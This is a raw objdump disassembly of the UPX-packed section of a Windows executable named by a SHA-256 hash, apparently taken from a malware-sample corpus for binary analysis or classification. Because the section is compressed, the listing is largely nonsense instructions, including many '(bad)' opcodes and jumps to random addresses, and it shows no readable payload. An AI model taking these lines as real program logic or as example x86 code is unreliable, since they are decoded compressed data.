
29ac2e0d0a5ced71cbbbbca2b01ae299d9f39af646e494675cedec3777284260.exe:     file format pei-i386


Disassembly of section UPX1:

00486000 <UPX1>:
  486000:	(bad)  
  486001:	sti    
  486002:	(bad)  
  486003:	call   DWORD PTR [ebp-0x75]
  486006:	in     al,dx
  486007:	xor    eax,eax
  486009:	sub    esp,0x3a8
  48600f:	cmp    BYTE PTR ds:0x4974ea,al
  486015:	je     0x486065
  486017:	push   0x8d5018a4
  48601c:	xchg   ebp,eax
  48601d:	pop    esp
  48601e:	cld    
  48601f:	(bad)  
  486020:	(bad)  
  486021:	(bad)  
  486023:	in     eax,dx
  486024:	fst    QWORD PTR [edx-0x5e]
  486027:	daa    
  486028:	mov    DWORD PTR [ecx-0x17dbfe64],eax
  48602e:	adc    eax,DWORD PTR [ecx]
  486030:	pop    ds
  486031:	cmp    al,0xa1
  486033:	sbb    BYTE PTR [ebp+0x1e],dh
  486036:	add    esp,0xc
  486039:	lea    ecx,[ebp-0x40231233]
  48603f:	pop    eax
  486040:	cmp    al,0x51
  486042:	push   0x2
  486044:	mov    DWORD PTR [ebp-0x7a7680ef],0x24601e63
  48604e:	push   DWORD PTR [edi]
  486050:	cmp    ebx,DWORD PTR [eax+eax*1-0x1]
  486054:	adc    eax,0x482490
  486059:	mov    esp,ebp
  48605b:	pop    ebp
  48605c:	ret    
  48605d:	int3   
  48605e:	inc    ecx
  48605f:	fdivp  st(6),st
  486061:	dec    DWORD PTR [ebx+0x33532446]
  486067:	fstp   TBYTE PTR [ebx]
  486069:	ret    
  48606a:	jne    0x4aaf74
  486070:	sbb    ch,BYTE PTR [ecx+ecx*4]
  486073:	pop    esi
  486074:	and    al,0xef
  486076:	mov    esi,0x5e89cf69
  48607b:	xor    BYTE PTR [esp+esi*1],al
  48607e:	cmp    BYTE PTR [eax+0x6f5b105e],cl
  486084:	cmp    BYTE PTR [esi+0x9],0x0
  486088:	mov    edi,0x3a6cd83d
  48608d:	sub    DWORD PTR [edx+ebp*2+0x8],ecx
  486091:	add    BYTE PTR ds:0x8504f6d3,al
  486097:	shl    BYTE PTR [eax+edx*1-0x75],0x26
  48609c:	mov    eax,0x8917dbff
  4860a1:	push   es
  4860a2:	dec    esi
  4860a3:	add    al,0x89
  4860a5:	dec    eax
  4860a6:	add    al,0xff
  4860a8:	push   es
  4860a9:	mov    DWORD PTR [esi+0x4],eax
  4860ac:	ret    
  4860ad:	push   ss
  4860ae:	mov    ds,WORD PTR [ebx]
  4860b0:	outs   dx,DWORD PTR ds:[esi]
  4860b1:	jg     0x486043
  4860b3:	fistp  QWORD PTR ss:[esi-0x74ebba75]
  4860ba:	dec    ebp
  4860bb:	pop    eax
  4860bc:	push   ebp
  4860bd:	or     BYTE PTR [edi-0x75],dl
  4860c0:	lahf   
  4860c1:	std    
  4860c2:	add    bh,bl
  4860c4:	jge    0x4860d2
  4860c6:	push   eax
  4860c7:	push   ecx
  4860c8:	push   edx
  4860c9:	mov    WORD PTR [esi],?
  4860cb:	cld    
  4860cc:	pop    edi
  4860cd:	pop    ebp
  4860ce:	ret    0x10
  4860d1:	aas    
  4860d2:	and    esp,0xfffffff8
  4860d5:	push   ebx
  4860d6:	jmp    eax
  4860d8:	sbb    edi,esp
  4860da:	mov    ebx,DWORD PTR [ebp+0x8]
  4860dd:	push   esi
  4860de:	cmp    ebx,DWORD PTR ds:0x816675b7
  4860e4:	call   DWORD PTR [ecx]
  4860e6:	jl     0x48615b
  4860e8:	sub    DWORD PTR [ebx+0x3b7212ff],eax
  4860ee:	mov    eax,0x3d3605e0
  4860f3:	call   0x844aab8d
  4860f8:	or     al,0x9f
  4860fa:	pop    edx
  4860fb:	push   ebp
  4860fc:	mov    cl,BYTE PTR [edi]
  4860fe:	or     edi,DWORD PTR ss:[esi+0x45]
  486102:	or     al,0x52
  486104:	push   eax
  486105:	push   edi
  486106:	push   ebx
  486107:	mov    ah,0x88
  486109:	es pop esi
  48610b:	pop    ebx
  48610c:	mov    eax,0xbb660cc2
  486111:	stc    
  486112:	mov    ah,0x0
  486114:	pusha  
  486115:	adc    esi,DWORD PTR [eax+edi*1+0x10]
  486119:	jbe    0x486167
  48611b:	sbb    BYTE PTR [edx],dl
  48611d:	add    edx,ebx
  48611f:	call   0x8bc:0x870fecf9
  486126:	ins    BYTE PTR es:[edi],dx
  486127:	mov    edx,0x10112c9e
  48612c:	jge    0x48614d
  48612e:	cmp    al,0xfc
  486130:	mov    bl,0xb1
  486132:	jne    0x4860e0
  486134:	jmp    0xc6e7634c
  486139:	xchg   ecx,eax
  48613a:	xchg   edx,eax
  48613b:	xchg   ecx,eax
  48613c:	jmp    0x4860e6
  48613e:	adc    edi,DWORD PTR [eax+ebx*8]
  486141:	jle    0x4860eb
  486143:	push   0x8bca8710
  486148:	repz xor al,0x2
  48614b:	dec    esp
  48614c:	mov    ?,WORD PTR [ecx+0x6f3fedbf]
  486152:	jle    0x486165
  486154:	lea    eax,[edi-0x1]
  486157:	cmp    eax,0x6
  48615a:	mov    ds:0x2400ff71,al
  48615f:	test   DWORD PTR [edi+esi*2],ebp
  486162:	iret   
  486163:	inc    ecx
  486164:	ret    
  486165:	adc    al,BYTE PTR [eax+0x16]
  486168:	add    DWORD PTR [esp+edx*8],eax
  48616b:	mov    ecx,0xfe37e86f
  486170:	repz imul esp,DWORD PTR [edi+0x6a306d],0x6a7bd022
  48617b:	add    BYTE PTR [eax-0x12],ch
  48617e:	sti    
  48617f:	mov    esp,0xe057333f
  486184:	push   0x48484e28
  486189:	fadd   QWORD PTR [ebx-0x583190c3]
  48618f:	ins    DWORD PTR es:[edi],dx
  486190:	mov    al,0x0
  486192:	mov    ds:0x268f75b7,eax
  486197:	fcomp  DWORD PTR [esi-0x5d]
  48619a:	mov    eax,0x7ce08f07
  48619f:	test   eax,0x85820401
  4861a4:	sti    
  4861a5:	mov    dh,0x7d
  4861a7:	repnz fidivr DWORD PTR [edi]
  4861aa:	pusha  
  4861ab:	mov    al,ds:0xdbff8b5a
  4861b0:	adc    edx,esi
  4861b2:	mov    dh,0x6
  4861b4:	and    BYTE PTR [eax-0x4e2cbd51],dl
  4861ba:	xchg   bl,dh
  4861bc:	movq   mm7,mm3
  4861bf:	call   0x48f6:0x871df1ac
  4861c6:	push   ebx
  4861c7:	push   edi
  4861c8:	js     0x486150
  4861ca:	or     BYTE PTR [ebp-0xf72fea8],bl
  4861d0:	xor    ecx,ebp
  4861d2:	clc    
  4861d3:	push   ebx
  4861d4:	push   eax
  4861d5:	pusha  
  4861d6:	push   esp
  4861d7:	mov    eax,ds:0x51e0fc78
  4861dc:	clc    
  4861dd:	or     BYTE PTR [eax+esi*8+0x3d804c0a],bl
  4861e4:	fcomp  st(5)
  4861e6:	adc    eax,0x3c907b4a
  4861eb:	adc    ah,ch
  4861ed:	pop    esp
  4861ee:	or     BYTE PTR [ecx+0x378967b5],cl
  4861f4:	ja     0x48618e
  4861f6:	mov    ds,WORD PTR [ebp-0x7a50fd4d]
  4861fc:	xor    DWORD PTR [eax-0x80],esp
  4861ff:	jg     0x48620a
  486201:	loope  0x4861f6
  486203:	std    
  486204:	jns    0x486218
  486206:	jp     0x486240
  486208:	lahf   
  486209:	xchg   esp,eax
  48620a:	add    DWORD PTR [edx],ebp
  48620c:	test   dl,al
  48620e:	push   ebx
  48620f:	push   esi
  486210:	pop    es
  486211:	iret   
  486212:	mov    bh,0xe0
  486214:	xor    edi,ebx
  486216:	sbb    eax,0x3fad5fe0
  48621b:	aas    
  48621c:	ds mov ah,0x4
  48621f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  486220:	add    esp,esi
  486222:	or     DWORD PTR [eax-0x6c],edx
  486225:	add    eax,ebx
  486227:	push   esi
  486228:	lea    esi,[ebx-0x4027e176]
  48622e:	in     al,dx
  48622f:	mov    al,ds:0x1006c757
  486234:	stos   DWORD PTR es:[edi],eax
  486235:	dec    eax
  486236:	or     bh,cl
  486238:	fsub   QWORD PTR [esi]
  48623a:	add    al,0xdf
  48623c:	aas    
  48623d:	mov    eax,edi
  48623f:	cmp    eax,0x2c8d8b8d
  486244:	adc    cl,BYTE PTR [ebp+ecx*4+0x7b]
  486248:	js     0x486258
  48624a:	add    edi,DWORD PTR [edi+esi*2-0x5]
  48624e:	mov    ?,WORD PTR [esp+esi*1]
  486251:	dec    ebx
  486252:	and    al,0x2f
  486254:	pop    edi
  486255:	adc    BYTE PTR [esi+ebx*2],dl
  486258:	jmp    0xfc29e970
  48625d:	and    bh,BYTE PTR [edi+0x808ff0c]
  486263:	cmp    DWORD PTR [eax],0xffffffb0
  486266:	in     al,dx
  486267:	inc    ebp
  486268:	aaa    
  486269:	(bad)  
  48626a:	outs   dx,DWORD PTR ds:[esi]
  48626b:	push   cs
  48626c:	push   ecx
  48626d:	xchg   ebx,eax
  48626e:	mov    edx,DWORD PTR [esi+0x6a]
  486271:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  486272:	or     BYTE PTR [edi],dh
  486274:	scas   eax,DWORD PTR es:[edi]
  486275:	repnz out dx,eax
  486277:	outs   dx,BYTE PTR ds:[esi]
  486278:	add    DWORD PTR [esi-0x75],edx
  48627b:	imul   DWORD PTR [eax+eax*1+0x14778d6c]
  486282:	dec    esp
  486283:	sbb    eax,0x6b0e8a41
  486288:	or     al,0x5e
  48628a:	dec    ebp
  48628b:	push   0x4
  48628d:	jmp    0x48624f
  48628f:	lods   eax,DWORD PTR ds:[si]
  486291:	shl    DWORD PTR [esi+0x61],cl
  486294:	dec    esp
  486295:	mov    DWORD PTR [eax],0xc3c489b9
  48629b:	jg     0x48628e
  48629d:	inc    eax
  48629e:	sub    eax,0x33db0efe
  4862a3:	leave  
  4862a4:	sbb    cl,BYTE PTR [eax]
  4862a6:	mov    edx,0xfe2f731
  4862ab:	nop
  4862ac:	rol    edi,0x46
  4862af:	jo     0x48629f
  4862b1:	jle    0x4862a2
  4862b3:	std    
  4862b4:	push   ss
  4862b5:	(bad)  [ebx]
  4862b7:	enter  0x7951,0x3e
  4862bb:	push   es
  4862bc:	and    BYTE PTR [esi-0x77],0x8
  4862c0:	mov    bh,0x9c
  4862c2:	mov    eax,esi
  4862c4:	jl     0x4862f6
  4862c6:	cmp    al,0xd8
  4862c8:	mov    ebx,0x571f065f
  4862cd:	lea    edi,[esi-0x5fb3ee4c]
  4862d3:	ret    
  4862d4:	mov    ?,ecx
  4862d6:	adc    al,0xac
  4862d8:	ja     0x4862a2
  4862da:	and    al,0x93
  4862dc:	pushf  
  4862dd:	mov    WORD PTR [esi-0x49],?
  4862e0:	push   ss
  4862e1:	xlat   BYTE PTR ds:[ebx]
  4862e2:	xchg   ecx,eax
  4862e3:	jbe    0x4862db
  4862e5:	cmp    al,0x5f
  4862e7:	mov    bl,0x1f
  4862e9:	sbb    al,0x11
  4862eb:	repz xor ecx,DWORD PTR [edi]
  4862ee:	jle    0x48632e
  4862f0:	adc    edi,esp
  4862f2:	test   BYTE PTR [eax+0x41877b2],cl
  4862f8:	cld    
  4862f9:	test   DWORD PTR [edi-0x59],edx
  4862fc:	jb     0x486362
  4862fe:	test   DWORD PTR [ebp+0x4e983cc4],esp
  486304:	(bad)  
  486305:	loop   0x4862e7
  486307:	mov    bl,0xeb
  486309:	inc    ebp
  48630a:	cld    
  48630b:	push   eax
  48630c:	mov    esi,0x468fde8
  486311:	fcom   DWORD PTR [edx+0x6a]
  486314:	imul   DWORD PTR [esi-0x4d]
  486317:	test   BYTE PTR [ebx+eiz*1],ah
  48631a:	lea    ebx,[ebp-0x7dbf47db]
  486320:	dec    edx
  486321:	arpl   WORD PTR [ecx],dx
  486323:	pop    esp
  486324:	pop    ss
  486325:	mov    BYTE PTR [esi],bl
  486327:	mov    ebx,0x30b8fc66
  48632c:	sbb    DWORD PTR [ebp-0x4],ecx
  48632f:	je     0x4862f3
  486331:	inc    ecx
  486332:	(bad)  
  486333:	and    WORD PTR [edi-0x7ac6112d],si
  48633a:	in     al,dx
  48633b:	dec    esp
  48633c:	int3   
  48633d:	push   ebp
  48633e:	gs push eax
  486340:	push   edi
  486341:	(bad)
  486345:	mov    ds:0x8cb822c,eax
  48634a:	add    bh,bh
  48634c:	popa   
  48634d:	xchg   ebx,eax
  48634f:	sbb    al,0xd8
  486351:	push   ds
  486352:	dec    esi
  486353:	push   es
  486354:	inc    ebp
  486355:	clc    
  486356:	shl    DWORD PTR [ecx*2-0xbba4c05],cl
  48635d:	add    al,0xe0
  48635f:	fsubr  st,st(0)
  486361:	in     al,dx
  486362:	dec    ebp
  486363:	(bad)  [ecx*2-0x575b1b10]
  48636a:	data16 adc ch,BYTE PTR [eax+esi*4+0x34f34d3c]
  486372:	mov    ah,0xb8
  486374:	mov    esp,0x34d3c4c0
  486379:	dec    edi
  48637a:	ror    DWORD PTR [eax+edx*4+0x51ccc894],cl
  486381:	repz xor al,0xcd
  486384:	rcr    BYTE PTR [eax-0x6d035f64],1
  48638a:	sti    
  48638b:	in     al,dx
  48638c:	mov    dl,0x78
  48638e:	clc    
  48638f:	lea    esp,[esp-0x6f0761d5]
  486396:	pop    esp
  486398:	aam    0xfd
  48639a:	jg     0x4863a2
  48639c:	rol    DWORD PTR [ebp-0x74f13bb6],0xdf
  4863a3:	shl    ebx,0x4
  4863a6:	add    ebx,DWORD PTR ds:0x3f4a912c
  4863ac:	js     0x4863a3
  4863ae:	mov    esp,0x840fdb24
  4863b3:	std    
  4863b4:	inc    edi
  4863b5:	call   0x8b9ad05d
  4863ba:	push   ebx
  4863bb:	add    al,0x8b
  4863bd:	jg     0x4863a4
  4863bf:	mov    dh,0xf8
  4863c1:	add    cl,BYTE PTR [edi]
  4863c3:	mov    bh,0x70
  4863c5:	or     BYTE PTR [eax-0x23ba3878],cl
  4863cb:	cmp    si,0x7f
  4863cf:	je     0x4863ec
  4863d1:	mov    edi,edi
  4863d3:	jge    0x4863d0
  4863d5:	in     eax,dx
  4863d6:	ret    0x498d
  4863d9:	ds js  0x4863e0
  4863dc:	add    eax,0x4
  4863df:	inc    ecx
  4863e0:	and    bh,BYTE PTR [edi+0x8]
  4863e3:	jg     0x48645a
  4863e5:	repnz into 
  4863e7:	test   ecx,ecx
  4863e9:	je     0x4863ec
  4863eb:	dec    ecx
  4863ec:	data16 (bad) 
  4863ee:	out    dx,al
  4863ef:	push   edx
  4863f0:	cld    
  4863f1:	test   esi,esi
  4863f3:	jne    0x48638a
  4863f5:	mov    esi,DWORD PTR [edx]
  4863f7:	mov    eax,0x76740470
  4863fc:	or     BYTE PTR ds:0xa6cab4aa,cl
  486402:	popf   
  486403:	adc    BYTE PTR ss:[esi],cl
  486406:	loopne 0x486408
  486408:	or     BYTE PTR [edx],ah
  48640a:	dec    eax
  48640b:	cld    
  48640c:	shl    DWORD PTR [ebp+ebp*4-0x18],cl
  486410:	add    eax,0xf651cb6
  486415:	mov    dh,0x88
  486417:	cmp    al,0x19
  486419:	dec    esp
  48641a:	mov    ebx,0x8dc4cbb9
  48641f:	cld    
  486420:	sbb    BYTE PTR [ebx+0x79a8044a],cl
  486426:	sub    ch,BYTE PTR [ebx]
  486428:	mov    dh,0x2b
  48642a:	sub    ah,dl
  48642c:	arpl   WORD PTR [edx],ax
  48642e:	sub    BYTE PTR [ebp-0x28],cl
  486431:	cmp    al,0x3c
  486433:	fs hlt 
  486435:	mov    bh,0x8a
  486437:	pop    ds
  486438:	sbb    cl,BYTE PTR [eax+0x5052daf0]
  48643e:	push   ecx
  48643f:	add    ah,ah
  486441:	loopne 0x486423
  486443:	mov    esi,DWORD PTR [ebp-0x41]
  486446:	ds pop edi
  486448:	mov    ah,0xec
  48644a:	sub    al,ch
  48644c:	mov    edx,0x11859cd9
  486451:	call   FWORD PTR [edi+0x6a]
  486454:	fld    DWORD PTR [edi-0x3f]
  486457:	xchg   BYTE PTR [esi],ch
  486459:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48645a:	lea    esp,[esp+eiz*8+0x66]
  48645e:	mov    esp,0x1226621a
  486463:	fdiv   DWORD PTR [edi]
  486465:	stos   BYTE PTR es:[edi],al
  486466:	je     0x4863ea
  486468:	add    al,0x40
  48646a:	mov    DWORD PTR [esi],ecx
  48646c:	xchg   esp,eax
  48646d:	push   esp
  48646e:	scas   al,BYTE PTR es:[edi]
  48646f:	in     al,0xfe
  486471:	mov    ebx,0xe656f882
  486476:	dec    ecx
  486477:	pop    DWORD PTR [ebx-0x1e8afac2]
  48647d:	mov    ecx,DWORD PTR [edx+ecx*4]
  486480:	aad    0x5b
  486482:	test   al,0xac
  486484:	frstor [eax+0x20]
  486487:	cmp    DWORD PTR [ecx],0x1c
  48648a:	sbb    ebx,DWORD PTR [edx-0x34]
  48648d:	pop    es
  48648e:	aam    0x40
  486490:	sbb    esi,DWORD PTR [edx+edi*2-0x8]
  486494:	lea    edi,[ebp-0x2c]
  486497:	lea    esi,[ebp-0x24]
  48649a:	cld    
  48649b:	inc    ebp
  48649c:	pushf  
  48649d:	mov    eax,0xed807391
  4864a2:	scas   eax,DWORD PTR es:[edi]
  4864a3:	dec    ebx
  4864a4:	(bad)  
  4864a5:	mov    eax,DWORD PTR [ecx+eax*4]
  4864a8:	data16 js 0x4864b3
  4864ab:	inc    eax
  4864ac:	stos   BYTE PTR es:[edi],al
  4864ad:	add    eax,0x8bc1db2f
  4864b2:	mov    ds:0xfe9ff623,al
  4864b7:	imul   edi,DWORD PTR [ebx-0x12144687],0x4ec2532
  4864c1:	cld    
  4864c2:	cmp    DWORD PTR [ebp-0x38],0x70
  4864c6:	test   BYTE PTR [edi-0x226ca59e],dh
  4864cc:	repz jge 0x4864a0
  4864cf:	mov    dh,0x12
  4864d1:	sahf   
  4864d2:	add    BYTE PTR [eax],bl
  4864d4:	(bad)  
  4864d5:	enter  0xbc73,0x4d
  4864d9:	sti    
  4864da:	mov    esi,0xec406cae
  4864df:	mov    WORD PTR [ebp+0x60],?
  4864e2:	cmp    DWORD PTR [edx-0x1f08f868],esi
  4864e8:	dec    eax
  4864e9:	push   edx
  4864ea:	push   0xffffff86
  4864ec:	pop    ds
  4864ed:	in     al,dx
  4864ee:	out    0x1e,al
  4864f0:	(bad)  
  4864f2:	scas   eax,DWORD PTR es:[edi]
  4864f3:	inc    edx
  4864f4:	jo     0x48654e
  4864f6:	pop    ds
  4864f7:	call   0xdb7bc701
  4864fc:	or     eax,0x5654b98b
  486501:	fimul  WORD PTR [ebx-0x51851fae]
  486507:	(bad)  
  486508:	hlt    
  486509:	mov    al,0x9e
  48650b:	rcr    dh,cl
  48650d:	in     eax,0x35
  48650f:	mov    ecx,0x31e6b4d4
  486514:	loopne 0x4864c6
  486516:	inc    esi
  486517:	sahf   
  486518:	jl     0x486568
  48651a:	hlt    
  48651b:	(bad)  
  48651c:	(bad)  {z}
  486521:	js     0x4864eb
  486523:	sbb    edi,DWORD PTR [edx-0xfaa740c]
  486529:	push   ecx
  48652a:	push   edx
  48652b:	mov    esi,0x830ee44
  486530:	pushf  
  486531:	ret    
  486532:	test   DWORD PTR [ebx+0x61],edi
  486535:	cmp    al,0xd2
  486537:	mov    esi,0xac10d3a6
  48653c:	push   esi
  48653d:	cwde   
  48653e:	xor    bh,dh
  486540:	mov    esp,0x7272c80e
  486545:	jb     0x4865b9
  486547:	mov    WORD PTR [eax+esi*4+0x40f6d0a4],?
  48654e:	lds    ebp,FWORD PTR [edx]
  486550:	pop    edi
  486551:	aas    
  486552:	ret    
  486553:	mov    eax,DWORD PTR [edx+0x57668d40]
  486559:	aam    0x68
  48655b:	add    DWORD PTR [edx],edx
  48655d:	data16 mov ah,bl
  486560:	push   ecx
  486561:	call   0x85cc2ea1
  486566:	sub    al,0xb2
  486568:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  486569:	push   es
  48656a:	cmp    bl,bl
  48656c:	popa   
  48656d:	inc    edx
  48656e:	push   es
  48656f:	jb     0x4865b9
  486571:	xchg   DWORD PTR [ecx],ecx
  486573:	lock cwde 
  486575:	jmp    0x3a4173ba
  48657a:	call   0x27a81e0b
  48657f:	push   0x7629a9d6
  486584:	add    al,0xfc
  486586:	pop    ecx
  486587:	sti    
  486588:	in     al,dx
  486589:	or     al,BYTE PTR [ebp-0x3323c5b2]
  48658f:	mov    bl,BYTE PTR [edi+0x1f]
  486592:	fsub   QWORD PTR ds:0x2f92f098
  486598:	sahf   
  486599:	jl     0x486577
  48659b:	popa   
  48659c:	into   
  48659d:	cld    
  48659e:	mov    eax,ds:0xb90e716a
  4865a3:	fsubr  QWORD PTR [esi+0x54]
  4865a6:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4865a8:	call   0x2784a639
  4865ad:	xchg   DWORD PTR [esp+ecx*4-0x74],ebx
  4865b1:	call   0x2847cf48
  4865b6:	cmp    DWORD PTR [ebx+0x7a],0xffffff8b
  4865ba:	jmp    DWORD PTR [ecx]
  4865bc:	jp     0x486600
  4865be:	add    BYTE PTR [ecx+0x79],bh
  4865c1:	push   es
  4865c2:	xchg   edi,esi
  4865c4:	cmp    al,0xef
  4865c6:	call   0x6f04a10
  4865cb:	sbb    ah,BYTE PTR [edx-0x27]
  4865ce:	es jge 0x486620
  4865d1:	sti    
  4865d2:	fidiv  DWORD PTR [ebx+0xe250677]
  4865d8:	sbb    DWORD PTR [eax+0x16],edi
  4865db:	in     al,0x81
  4865dd:	push   cs
  4865de:	stc    
  4865df:	pop    ss
  4865e0:	sti    
  4865e1:	stos   BYTE PTR es:[edi],al
  4865e2:	int    0xb6
  4865e4:	sbb    DWORD PTR ss:[esi],edx
  4865e7:	push   es
  4865e8:	jo     0x4865ff
  4865ea:	add    BYTE PTR [ecx],al
  4865ec:	xor    al,BYTE PTR [ebx]
  4865ee:	add    al,0x5
  4865f0:	push   es
  4865f1:	invlpg BYTE PTR [eax]
  4865f4:	repnz enter 0x7bf,0x7
  4865f9:	or     BYTE PTR [ecx],cl
  4865fb:	or     cl,BYTE PTR [ebx]
  4865fd:	or     al,0xf
  4865ff:	or     eax,0x4e8dcc0e
  486604:	sbb    eax,0x4d1f6938
  486609:	push   cs
  48660a:	adc    al,0x4
  48660c:	pop    ecx
  48660d:	rol    DWORD PTR [ebp+0x2b],1
  486610:	mov    esi,0x75a25701
  486615:	push   ds
  486616:	jmp    0x5dff:0x244a7f34
  48661d:	fsubr  st(6),st
  48661f:	cs jo  0x4865e1
  486622:	and    al,0x14
  486624:	in     al,0xc6
  486626:	pop    esp
  486627:	cs or  al,0xb0
  48662a:	add    DWORD PTR [edi-0x3d],ebx
  48662d:	add    eax,0x48b77619
  486632:	xor    ch,dh
  486634:	outs   dx,DWORD PTR ds:[esi]
  486635:	add    ah,BYTE PTR [esi]
  486637:	dec    ebp
  486638:	or     ecx,ebx
  48663a:	jg     0x4865c1
  48663c:	lods   eax,DWORD PTR ds:[esi]
  48663d:	dec    ecx
  48663e:	lahf   
  48663f:	push   cs
  486640:	add    BYTE PTR [edi+0x8],dh
  486643:	mov    DWORD PTR [edi+0xa],0xe017aec5
  48664a:	add    bl,al
  48664c:	stos   BYTE PTR es:[edi],al
  48664d:	xor    esi,esi
  48664f:	mov    eax,DWORD PTR [edi-0x7e]
  486652:	sbb    al,0xb0
  486654:	mov    BYTE PTR ds:0x6608d078,dl
  48665a:	retf   
  48665b:	add    eax,0x6103d953
  486660:	mov    gs,ebp
  486662:	inc    esi
  486663:	cmp    edx,DWORD PTR [edx+0x72]
  486666:	loopne 0x486684
  486668:	pop    ebx
  486669:	jle    0x48663e
  48666b:	(bad)  
  48666c:	fistp  WORD PTR [edi]
  48666e:	adc    BYTE PTR [ebx],bh
  486670:	push   eax
  486671:	sbb    al,0x7d
  486673:	sbb    DWORD PTR [esi-0x73],edx
  486676:	jb     0x486679
  486678:	mov    DWORD PTR [eax],esi
  48667a:	mov    eax,DWORD PTR [eax+0x18]
  48667d:	into   
  48667e:	nop
  48667f:	pop    esi
  486680:	cmp    ecx,eax
  486682:	je     0x486689
  486684:	mov    al,0xb
  486686:	fwait
  486687:	stc    
  486688:	shr    BYTE PTR [esp+ebp*1],1
  48668b:	mov    ds:0x8b8aa8bb,al
  486690:	rol    DWORD PTR [edx+ebp*4-0x40],0x1d
  486695:	popf   
  486696:	xor    al,al
  486698:	pop    ebx
  486699:	fisttp WORD PTR [eax+0x5]
  48669c:	adc    DWORD PTR [esi-0x62],ebp
  48669f:	sub    esp,0xb9f06bc
  4866a5:	cld    
  4866a6:	sbb    cl,BYTE PTR [esp+esi*4]
  4866a9:	in     al,dx
  4866aa:	loop   0x48666c
  4866ac:	mov    esi,eax
  4866ae:	mov    eax,0x3e15d19c
  4866b3:	lock lea ecx,[esp+0x10]
  4866b8:	sar    BYTE PTR [ebp+ecx*8+0x7fdefc04],0x73
  4866c0:	test   BYTE PTR [edx+0x66d23357],ah
  4866c6:	mov    DWORD PTR [esp+0x20],edx
  4866ca:	lea    ebx,[esi+eax*1+0x44]
  4866ce:	inc    ecx
  4866cf:	adc    DWORD PTR [ebp+ebp*8-0x11],ebx
  4866d3:	hlt    
  4866d4:	rcl    DWORD PTR [esi+0x54],0x14
  4866d8:	test   al,0x40
  4866da:	cmp    DWORD PTR [esi+0x60],0x0
  4866de:	adc    dl,BYTE PTR [edx+0x3f06de17]
  4866e4:	mov    edi,DWORD PTR ds:0xc24bf850
  4866ea:	cmp    al,0xc1
  4866ec:	sti    
  4866ed:	inc    edx
  4866ee:	sar    DWORD PTR [ebp+0x2824848d],cl
  4866f4:	mov    dh,0x4c
  4866f6:	push   eax
  4866f7:	stos   DWORD PTR es:[edi],eax
  4866f8:	xchg   esp,eax
  4866f9:	imul   edi,DWORD PTR [edi-0x74e38ee1],0x7f6ac40d
  486703:	push   edx
  486704:	push   edx
  486705:	xor    al,0x50
  486707:	mov    DWORD PTR [eax+0x38],0xc637779d
  48670e:	push   ecx
  48670f:	mov    WORD PTR [esp+edi*1],fs
  486712:	adc    al,0x22
  486714:	inc    eax
  486715:	int    0xee
  486717:	cmp    al,0xdd
  486719:	add    al,0x15
  48671b:	inc    esp
  48671c:	add    al,0x7d
  48671e:	mov    dh,0x8d
  486720:	cmp    BYTE PTR [eax],bh
  486722:	iret   
  486723:	lahf   
  486724:	data16 ins BYTE PTR es:[edi],dx
  486726:	bound  edx,QWORD PTR [ebx+esi*1-0x37]
  48672a:	push   eax
  48672b:	data16 ds jle 0x4866c9
  48672f:	sar    BYTE PTR [eax+esi*2+0x5],0x63
  486734:	inc    eax
  486735:	sbb    al,0x20
  486737:	push   ecx
  486738:	push   0x1
  48673a:	xchg   ebx,eax
  48673b:	popa   
  48673c:	shl    DWORD PTR [ecx],0xc7
  48673f:	mov    ds:0xf061b7b4,eax
  486744:	mov    esp,DWORD PTR [ecx+0x1f]
  486747:	in     al,dx
  486748:	cmp    BYTE PTR [ecx+0x7bf0d0f4],ah
  48674e:	scas   eax,DWORD PTR es:[edi]
  48674f:	mov    ebx,0x81f0bf0c
  486754:	pop    eax
  486755:	sbb    eax,0xffffffc7
  486758:	inc    ebp
  486759:	loopne 0x48674c
  48675b:	inc    ebp
  48675c:	in     al,0xb
  48675e:	(bad)
  486761:	cmc    
  486762:	js     0x486770
  486764:	sbb    al,0x9a
  486766:	lea    ecx,[ebp-0x28]
  486769:	push   ecx
  48676a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48676b:	mov    ch,0x76
  48676d:	add    eax,0x8bb18bef
  486772:	into   
  486773:	stos   DWORD PTR es:[edi],eax
  486774:	fdivrp st(0),st
  486776:	jl     0x4867e6
  486778:	rcr    esi,cl
  48677a:	sti    
  48677b:	mov    edi,0x3c7f1ad8
  486780:	mov    DWORD PTR [ebp-0x28],edi
  486783:	mov    edi,0x898f8204
  486788:	jnp    0x4867df
  48678a:	sbb    eax,0xd8c803be
  48678f:	push   edx
  486790:	sub    DWORD PTR [eax+ecx*2],0xffffffc6
  486794:	add    eax,0x595605d6
  486799:	aad    0xde
  48679b:	in     al,0x0
  48679d:	add    DWORD PTR [esi+0x3e],eax
  4867a0:	(bad)  [edx]
  4867a2:	ja     0x486753
  4867a4:	mov    eax,ds:0xbb029336
  4867a9:	aaa    
  4867aa:	mov    eax,ds:0x68f4ece
  4867af:	add    dl,BYTE PTR [esi-0x42a6a86b]
  4867b5:	lds    ecx,FWORD PTR [esi]
  4867b7:	pop    eax
  4867b8:	xor    ebp,DWORD PTR [eax+eax*2+0x48eb6c06]
  4867bf:	push   ss
  4867c0:	loop   0x486744
  4867c2:	mov    ebx,0x207c0e3
  4867c7:	add    eax,DWORD PTR [ebx]
  4867c9:	rol    BYTE PTR [ebx],0xfb
  4867cc:	sbb    DWORD PTR [edx],0xffffffe3
  4867cf:	inc    edx
  4867d0:	in     eax,dx
  4867d1:	and    al,0x8e
  4867d3:	sbb    DWORD PTR [edx+0x7c],eax
  4867d6:	jg     0x4867e1
  4867d8:	add    dl,BYTE PTR [edx+0x57]
  4867db:	push   eax
  4867dc:	mov    DWORD PTR [esi],eax
  4867de:	mov    ds:0x14975cfe,al
  4867e3:	fisub  DWORD PTR [eax]
  4867e5:	dec    eax
  4867e6:	repnz lods eax,DWORD PTR ds:[esi]
  4867e8:	dec    eax
  4867e9:	outs   dx,BYTE PTR ds:[esi]
  4867ea:	imul   ebp,DWORD PTR [edi],0xa53e257e
  4867f0:	push   ss
  4867f1:	in     al,dx
  4867f2:	or     BYTE PTR [ebx],bh
  4867f4:	clc    
  4867f5:	jae    0x722b91a
  4867fb:	(bad)  
  4867fc:	cld    
  4867fd:	pop    DWORD PTR [ebx-0x3c87fb1f]
  486803:	lahf   
  486804:	or     al,0xa4
  486806:	mov    edi,ecx
